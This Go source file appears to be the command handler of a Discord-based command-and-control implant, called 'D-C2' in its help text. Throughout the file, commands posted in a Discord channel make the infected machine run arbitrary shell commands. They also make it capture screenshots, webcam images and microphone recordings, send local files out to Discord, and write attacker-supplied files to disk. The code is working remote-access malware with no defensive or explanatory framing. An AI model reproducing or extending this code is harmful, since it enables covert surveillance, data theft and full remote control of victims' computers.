package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/bwmarrin/discordgo"
)

func handleInteraction(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if i.ChannelID != myChannelId {
		return
	}

	switch i.Type {
	case discordgo.InteractionApplicationCommand:
		data := i.ApplicationCommandData()
		switch data.Name {
		case "help":
			content := "**D‑C2 Help**\n\n" +
				"Use these controls in this device channel:\n\n" +
				"**Slash commands**\n" +
				"/cmd `<command>`          – run shell command\n" +
				"/screenshot              – capture screenshots of all displays\n" +
				"/camera                  – capture a snapshot from the default camera\n" +
				"/mic `[duration]` `[path]` – record from microphone (seconds, optional path)\n" +
				"/log `<on|off>`          – stream or stop logs into this channel\n" +
				"/cwd                     – show current working directory\n" +
				"/ls `[path]`              – list directory (current or given path)\n" +
				"/download `<src>` `[dst]` – download file (src path, optional label)\n" +
				"/upload `<file>` `<dst>`  – upload attached file to dst path\n" +
				"/restart                 – restart this client process\n\n" +
				"**Emoji commands**\n" +
				"📸                        – capture screenshots of all displays\n" +
				"📷                        – capture a snapshot from the default camera\n" +
				"🎙                        – record 10 seconds from microphone\n" +
				"👇 `<path>`                – download file from this machine (size < 8 MB)\n" +
				"☝️ `<path>` *attach         – upload attached file to this path\n" +
				"🔁                        – restart this client\n" +
				"💀                        – terminate this client\n\n" +
				"**Buttons**\n" +
				"whoami                    – show current user\n" +
				"id                        – show user / UID information\n" +
				"hostname                  – show device hostname\n" +
				"ip info                   – show IP configuration\n" +
				"cwd                       – show current working directory\n\n" +
				"Send `help` or `/help` anytime to show this help again."
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: content,
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
		case "cmd":
			var cmdStr string
			for _, opt := range data.Options {
				if opt.Name == "command" {
					cmdStr = opt.StringValue()
					break
				}
			}
			if cmdStr == "" {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "No command provided.",
						Flags:   discordgo.MessageFlagsEphemeral,
					},
				})
				return
			}
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `" + cmdStr + "`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			runCommandString(s, i.ChannelID, nil, cmdStr)
		case "screenshot":
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "📸 Capturing screenshots...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			handleScreenshot(s, i.ChannelID, nil)
		case "camera":
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "📷 Capturing camera snapshot...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			handleCameraSnapshot(s, i.ChannelID, nil)
		case "mic":
			var seconds int64 = 10
			var path string
			log.Printf("MIC slash command invoked: channel=%s user=%s", i.ChannelID, i.Member.User.ID)
			for _, opt := range data.Options {
				if opt.Name == "duration" {
					seconds = opt.IntValue()
				}
				if opt.Name == "path" {
					path = opt.StringValue()
				}
			}
			log.Printf("MIC options: seconds=%d path=%s", seconds, path)
			if seconds <= 0 {
				seconds = 10
			}
			if seconds > 300 {
				seconds = 300
			}
			if strings.HasPrefix(path, "~/") {
				if home, err := os.UserHomeDir(); err == nil {
					path = home + string(os.PathSeparator) + path[2:]
				}
			}
			log.Printf("MIC normalized: seconds=%d resolvedPath=%s", seconds, path)
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: fmt.Sprintf("🎙 Recording %d seconds from microphone...", seconds),
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			log.Printf("MIC starting handleMicRecord: channel=%s", i.ChannelID)
			handleMicRecord(s, i.ChannelID, nil, int(seconds), path)
			log.Printf("MIC handleMicRecord returned: channel=%s", i.ChannelID)
		case "log":
			var mode string
			for _, opt := range data.Options {
				if opt.Name == "mode" {
					mode = strings.ToLower(opt.StringValue())
					break
				}
			}
			if mode != "on" && mode != "off" {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "Mode must be `on` or `off`.",
						Flags:   discordgo.MessageFlagsEphemeral,
					},
				})
				return
			}
			if mode == "on" {
				enableLogStreaming(s, i.ChannelID)
			} else {
				disableLogStreaming()
			}
			resp := "Log streaming disabled for this channel."
			if mode == "on" {
				resp = "Log streaming enabled for this channel."
			}
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: resp,
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
		case "cwd":
			cmd := "pwd"
			if runtime.GOOS == "windows" {
				cmd = "cd"
			}
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `" + cmd + "`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			runCommandString(s, i.ChannelID, nil, cmd)
		case "ls":
			var path string
			for _, opt := range data.Options {
				if opt.Name == "path" {
					path = opt.StringValue()
					break
				}
			}
			base := "ls"
			if runtime.GOOS == "windows" {
				base = "dir"
			}
			cmdStr := base
			if path != "" {
				cmdStr = base + " " + path
			}
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `" + cmdStr + "`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			runCommandString(s, i.ChannelID, nil, cmdStr)
		case "ps":
			cmdStr := "ps aux"
			if runtime.GOOS == "windows" {
				cmdStr = "tasklist"
			}
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `" + cmdStr + "`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			runCommandString(s, i.ChannelID, nil, cmdStr)
		case "pidinfo":
			var pidVal int64
			for _, opt := range data.Options {
				if opt.Name == "pid" {
					pidVal = opt.IntValue()
					break
				}
			}
			if pidVal <= 0 {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "Invalid PID.",
						Flags:   discordgo.MessageFlagsEphemeral,
					},
				})
				return
			}
			cmdStr := ""
			if runtime.GOOS == "windows" {
				cmdStr = fmt.Sprintf("tasklist /FI \"PID eq %d\"", pidVal)
			} else {
				cmdStr = fmt.Sprintf("ps -p %d -o pid,ppid,user,pcpu,pmem,etime,cmd", pidVal)
			}
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `" + cmdStr + "`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			runCommandString(s, i.ChannelID, nil, cmdStr)
		case "download":
			var srcPath string
			for _, opt := range data.Options {
				if opt.Name == "source" {
					srcPath = opt.StringValue()
				}
			}
			if srcPath == "" {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "No source path provided.",
						Flags:   discordgo.MessageFlagsEphemeral,
					},
				})
				return
			}
			if strings.HasPrefix(srcPath, "~/") {
				if home, err := os.UserHomeDir(); err == nil {
					srcPath = home + string(os.PathSeparator) + srcPath[2:]
				}
			}
			f, err := os.Open(srcPath)
			if err != nil {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "Cannot open file: " + srcPath + " (" + err.Error() + ")",
						Flags:   discordgo.MessageFlagsEphemeral,
					},
				})
				return
			}
			defer f.Close()
			fi, err := f.Stat()
			if err != nil {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "Cannot stat file: " + srcPath + " (" + err.Error() + ")",
						Flags:   discordgo.MessageFlagsEphemeral,
					},
				})
				return
			}
			if fi.Size() >= 8388608 {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "File is bigger than 8MB 😔",
						Flags:   discordgo.MessageFlagsEphemeral,
					},
				})
				return
			}
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "📥 Downloading `" + filepath.Base(srcPath) + "`...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			fileStruct := &discordgo.File{Name: filepath.Base(srcPath), Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			s.ChannelMessageSendComplex(i.ChannelID, &discordgo.MessageSend{
				Files: fileArray,
			})
		case "upload":
			var destPath string
			var attachment *discordgo.MessageAttachment
			for _, opt := range data.Options {
				if opt.Name == "destination" {
					destPath = opt.StringValue()
				}
				if opt.Name == "source" {
					if data.Resolved != nil && data.Resolved.Attachments != nil {
						if id, ok := opt.Value.(string); ok {
							if a, ok := data.Resolved.Attachments[id]; ok {
								attachment = a
							}
						}
					}
				}
			}
			if destPath == "" || attachment == nil {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "Source attachment and destination path are required.",
						Flags:   discordgo.MessageFlagsEphemeral,
					},
				})
				return
			}
			if strings.HasPrefix(destPath, "~/") {
				if home, err := os.UserHomeDir(); err == nil {
					destPath = home + string(os.PathSeparator) + destPath[2:]
				}
			}
			if info, err := os.Stat(destPath); err == nil && info.IsDir() {
				destPath = filepath.Join(destPath, attachment.Filename)
			}
			out, err := os.Create(destPath)
			if err != nil {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "Cannot create file: " + destPath + " (" + err.Error() + ")",
						Flags:   discordgo.MessageFlagsEphemeral,
					},
				})
				return
			}
			defer out.Close()
			resp, err := http.Get(attachment.URL)
			if err != nil {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "Download failed: " + err.Error(),
						Flags:   discordgo.MessageFlagsEphemeral,
					},
				})
				return
			}
			defer resp.Body.Close()
			_, err = io.Copy(out, resp.Body)
			if err != nil {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "Write failed: " + err.Error(),
						Flags:   discordgo.MessageFlagsEphemeral,
					},
				})
				return
			}
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "☝️ Uploaded file to " + destPath,
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
		case "restart":
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "🔁 Restarting client...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			err := restartClient()
			if err != nil {
				s.ChannelMessageSend(i.ChannelID, "Restart failed: "+err.Error())
			}
		default:
		}
	case discordgo.InteractionMessageComponent:
		data := i.MessageComponentData()
		switch data.CustomID {
		case "d2c_screenshot":
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "📸 Capturing screenshots...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			ref := &discordgo.MessageReference{
				MessageID: i.Message.ID,
				ChannelID: i.ChannelID,
				GuildID:   i.GuildID,
			}
			handleScreenshot(s, i.ChannelID, ref)
		case "d2c_run_cmd":
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseModal,
				Data: &discordgo.InteractionResponseData{
					CustomID: "d2c_cmd_modal",
					Title:    "Run command",
					Components: []discordgo.MessageComponent{
						discordgo.ActionsRow{
							Components: []discordgo.MessageComponent{
								&discordgo.TextInput{
									CustomID:    "d2c_cmd_input",
									Label:       "Shell command",
									Style:       discordgo.TextInputShort,
									Placeholder: "whoami",
									Required:    true,
								},
							},
						},
					},
				},
			})
		case "d2c_ls":
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseModal,
				Data: &discordgo.InteractionResponseData{
					CustomID: "d2c_ls_modal",
					Title:    "List directory",
					Components: []discordgo.MessageComponent{
						discordgo.ActionsRow{
							Components: []discordgo.MessageComponent{
								&discordgo.TextInput{
									CustomID:    "d2c_ls_input",
									Label:       "ls path",
									Style:       discordgo.TextInputShort,
									Placeholder: "/path",
									Value:       "ls ",
									Required:    true,
								},
							},
						},
					},
				},
			})
		case "d2c_q_cwd":
			cmd := "pwd"
			if runtime.GOOS == "windows" {
				cmd = "cd"
			}
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `" + cmd + "`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			ref := &discordgo.MessageReference{
				MessageID: i.Message.ID,
				ChannelID: i.ChannelID,
				GuildID:   i.GuildID,
			}
			runCommandString(s, i.ChannelID, ref, cmd)
		case "d2c_q_whoami":
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `whoami`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			ref := &discordgo.MessageReference{
				MessageID: i.Message.ID,
				ChannelID: i.ChannelID,
				GuildID:   i.GuildID,
			}
			runCommandString(s, i.ChannelID, ref, "whoami")
		case "d2c_q_id":
			cmd := "id"
			if runtime.GOOS == "windows" {
				cmd = "whoami /user"
			}
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `" + cmd + "`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			ref := &discordgo.MessageReference{
				MessageID: i.Message.ID,
				ChannelID: i.ChannelID,
				GuildID:   i.GuildID,
			}
			runCommandString(s, i.ChannelID, ref, cmd)
		case "d2c_q_hostname":
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `hostname`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			ref := &discordgo.MessageReference{
				MessageID: i.Message.ID,
				ChannelID: i.ChannelID,
				GuildID:   i.GuildID,
			}
			runCommandString(s, i.ChannelID, ref, "hostname")
		case "d2c_q_ip":
			cmd := "ip addr"
			if runtime.GOOS == "windows" {
				cmd = "ipconfig"
			}
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `" + cmd + "`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			ref := &discordgo.MessageReference{
				MessageID: i.Message.ID,
				ChannelID: i.ChannelID,
				GuildID:   i.GuildID,
			}
			runCommandString(s, i.ChannelID, ref, cmd)
		default:
		}
	case discordgo.InteractionModalSubmit:
		data := i.ModalSubmitData()
		switch data.CustomID {
		case "d2c_cmd_modal":
			var cmdStr string
			for _, row := range data.Components {
				ar, ok := row.(discordgo.ActionsRow)
				if !ok {
					continue
				}
				for _, c := range ar.Components {
					if input, ok := c.(*discordgo.TextInput); ok && input.CustomID == "d2c_cmd_input" {
						cmdStr = input.Value
					}
				}
			}
			if cmdStr == "" {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "No command provided.",
						Flags:   discordgo.MessageFlagsEphemeral,
					},
				})
				return
			}
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `" + cmdStr + "`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			runCommandString(s, i.ChannelID, nil, cmdStr)
		case "d2c_ls_modal":
			var cmdStr string
			for _, row := range data.Components {
				ar, ok := row.(discordgo.ActionsRow)
				if !ok {
					continue
				}
				for _, c := range ar.Components {
					if input, ok := c.(*discordgo.TextInput); ok && input.CustomID == "d2c_ls_input" {
						cmdStr = input.Value
					}
				}
			}
			if cmdStr == "" {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "No command provided.",
						Flags:   discordgo.MessageFlagsEphemeral,
					},
				})
				return
			}
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Running: `" + cmdStr + "`",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			runCommandString(s, i.ChannelID, nil, cmdStr)
		default:
		}
	default:
	}
}
